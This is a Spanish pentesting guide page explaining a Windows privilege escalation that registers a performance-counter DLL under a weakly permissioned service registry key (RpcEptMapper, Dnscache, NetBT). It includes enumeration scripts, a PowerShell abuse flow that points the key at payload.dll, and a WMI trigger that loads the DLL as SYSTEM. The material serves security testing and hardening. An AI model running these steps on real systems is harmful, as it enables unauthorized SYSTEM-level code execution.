# Permiso AppendData/AddSubdirectory sobre el registro de un servicio

{{#include ../../banners/hacktricks-training.md}}

**La publicación original está en** [**https://itm4n.github.io/windows-registry-rpceptmapper-eop/**](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)<sup>[[3]](#references)</sup>

## Resumen

Si solo tienes **`Create Subkey`** / **`AppendData/AddSubdirectory`** sobre una clave del registro de un servicio, esto sigue siendo una buena pista de privesc. Normalmente **no puedes** sobrescribir directamente `ImagePath`, `ServiceDll` u otros valores existentes, pero aún podrías crear una clave secundaria **`Performance`** bajo:

- **`HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper`**
- **`HKLM\SYSTEM\CurrentControlSet\Services\Dnscache`**
- Cualquier otra clave **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`** donde tu token tenga **`KEY_CREATE_SUB_KEY`**

El truco es que Windows todavía admite el modelo de registro heredado **PerfLib V1**. Si un servicio tiene una subclave **`Performance`**, Windows puede cargar una DLL desde allí cuando un consumidor de contadores de rendimiento solicita datos.

Según la documentación de Microsoft, el registro mínimo es:<sup>[[1]](#references)</sup>
```text
HKLM\SYSTEM\CurrentControlSet\Services\<service>\Performance
Library = C:\Path\payload.dll
Open    = OpenPerfData
Collect = CollectPerfData
Close   = ClosePerfData
```
Por lo tanto, la conclusión ofensiva es: **no descartes un hallazgo del registro de un servicio solo porque obtuviste `CreateSubKey` en lugar de `SetValue`**.<sup>[[3]](#references)</sup>

## Por qué esto es suficiente para lograr ejecución de código

La subclave `Performance` normalmente **no existe de forma predeterminada** en estos servicios, por lo que **`KEY_CREATE_SUB_KEY`** es la primitive que necesitas. Una vez que la clave existe y contiene `Library`/`Open`/`Collect`/`Close`, cualquier **consumidor de contadores de rendimiento** puede activar la carga de la DLL.<sup>[[3]](#references)</sup>

Algunos detalles importantes:

- El valor **`Library`** puede apuntar a una **ruta completa de una DLL**.
- La DLL debe exportar **`OpenPerfData`**, **`CollectPerfData`** y **`ClosePerfData`**, y devolver `ERROR_SUCCESS`.
- El código se ejecuta en el **contexto del consumidor**, **no necesariamente en el propio proceso del servicio vulnerable**.
- En el caso clásico de `RpcEptMapper` / `Dnscache`, una **consulta de rendimiento de WMI** puede hacer que **`wmiprvse.exe`** cargue la DLL como **`NT AUTHORITY\SYSTEM`**.

Por eso es fácil pasar por alto esta primitive durante el triage: la clave del servicio principal no tiene permisos de escritura "completos", pero aun así puede weaponizarse.

## Enumeración rápida

Comprobación manual con **AccessChk**:
```bash
accesschk.exe -k -w hklm\system\currentcontrolset\services\rpceptmapper
accesschk.exe -k -w hklm\system\currentcontrolset\services\dnscache
```
Ejemplo de PowerShell para buscar principales con pocos privilegios que tengan **`CreateSubKey`** en claves de servicio:
```powershell
Get-ChildItem HKLM:\SYSTEM\CurrentControlSet\Services | ForEach-Object {
$weak = (Get-Acl $_.PSPath).Access | Where-Object {
$_.AccessControlType -eq 'Allow' -and
($_.RegistryRights -band [System.Security.AccessControl.RegistryRights]::CreateSubKey) -eq [System.Security.AccessControl.RegistryRights]::CreateSubKey -and
$_.IdentityReference -match 'Users|Authenticated Users|INTERACTIVE|Network Configuration Operators'
}
if ($weak) {
[pscustomobject]@{Service=$_.PSChildName; Principals=($weak.IdentityReference -join ', '); Rights=($weak.RegistryRights -join '; ')}
}
}
```
Herramientas útiles:

- **PrivescCheck**: `Get-ModifiableRegistryPath` se creó específicamente para detectar esta clase de problema.<sup>[[3]](#references)</sup>
- **SharpUp**: `SharpUp.exe audit ModifiableServiceRegistryKeys`
- **Perfusion**: automatiza la colocación de DLL, el registro de `Performance`, el desencadenador de WMI, la duplicación de tokens y la limpieza en objetivos vulnerables antiguos (por ejemplo: `Perfusion.exe -c cmd -i -k Dnscache`).<sup>[[4]](#references)</sup>

## Flujo de abuso

Crea la subclave `Performance` y rellena los valores requeridos:<sup>[[3]](#references)</sup>
```powershell
$svc = 'RpcEptMapper' # or Dnscache / NetBT / another vulnerable service
$k = "HKLM:\SYSTEM\CurrentControlSet\Services\$svc\Performance"
New-Item $k -Force | Out-Null
New-ItemProperty $k -Name Library -Value "$pwd\payload.dll" -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Open -Value 'OpenPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Collect -Value 'CollectPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Close -Value 'ClosePerfData' -PropertyType String -Force | Out-Null
```
A continuación, activa un consumidor de rendimiento **privilegiado**. Un ejemplo clásico es una consulta WMI sobre clases `Win32_Perf*`:<sup>[[3]](#references)</sup>
```powershell
powershell.exe -NoProfile -Command "Get-WmiObject -List | Where-Object { $_.Name -like 'Win32_Perf*' } | Out-Null"
```
Notas operativas:

- Iniciar **`perfmon.exe`** es útil para verificar que el registro del contador sea correcto, pero normalmente solo carga la DLL en **tu propio contexto de usuario**.
- Para un LPE real, activa un consumidor **privileged** como **WMI**.
- Si estás escribiendo tu propio exploit, iniciar `cmd.exe` directamente desde dentro de la DLL normalmente te deja con una shell en la **session 0**. `Perfusion` resuelve esto duplicando el token **privileged** en un proceso creado en estado suspendido dentro de la session del atacante.<sup>[[4]](#references)</sup>
- Haz coincidir la arquitectura de la DLL con la del consumidor objetivo (**x64 en sistemas x64**).

## Notas de versión / desarrollos recientes

Históricamente, las claves débiles integradas eran:<sup>[[4]](#references)</sup>

- **Windows 7 / Windows Server 2008 R2**: `RpcEptMapper` y `Dnscache`
- **Windows 8 / Windows Server 2012**: `RpcEptMapper`

`Perfusion` señala que las actualizaciones de **abril de 2021** eliminaron la vía de explotación sencilla en **Windows 8 / Windows Server 2012** actualizados, mientras que **Windows 7 / Windows Server 2008 R2** siguieron siendo explotables mediante **`Dnscache`**.<sup>[[4]](#references)</sup>

Este primitive **no es únicamente histórico**. En **enero de 2025**, Microsoft corrigió un problema relacionado de AD DS en el que los miembros de **`Network Configuration Operators`** podían crear subclaves bajo **`Dnscache`** y **`NetBT`**, y la misma idea de **registro de DLL de contadores de rendimiento** podía reutilizarse para alcanzar **SYSTEM** en sistemas compatibles.<sup>[[2]](#references)</sup>

Por tanto, la lección moderna es genérica: siempre que un principal con pocos privilegios tenga **`CreateSubKey`** sobre **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`**, comprueba si una clave secundaria **`Performance`** es suficiente antes de descartar el hallazgo.

## Referencias

- [1] [Microsoft Learn - Creación de la clave de rendimiento de la aplicación](https://learn.microsoft.com/en-us/windows/win32/perfctrs/creating-the-applications-performance-key)
- [2] [BirkeP - Vulnerabilidad de elevación de privilegios de Active Directory Domain Services (CVE-2025-21293)](https://birkep.github.io/posts/Windows-LPE/)
- [3] [itm4n - Permisos inseguros del registro del servicio Windows RpcEptMapper EoP](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)
- [4] [itm4n - Perfusion (exploit para la vulnerabilidad de permisos de la clave de registro de RpcEptMapper)](https://github.com/itm4n/Perfusion)

{{#include ../../banners/hacktricks-training.md}}
